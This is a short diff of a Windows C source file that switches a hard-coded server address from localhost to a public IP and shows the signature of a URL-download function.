@@ -4,8 +4,8 @@
 #pragma  comment(lib, "WININET.lib")
 
 char g_passkey_big[128];
-//char *g_server_address = "http://59.51.45.21:80/";
-char *g_server_address = "http://127.0.0.1:8080/";
+char *g_server_address = "http://59.51.45.21:80/";
+//char *g_server_address = "http://127.0.0.1:8080/";
 
 HRESULT download_url(char *url_to_download, char *out, int outlen /*= 64*/)
 {
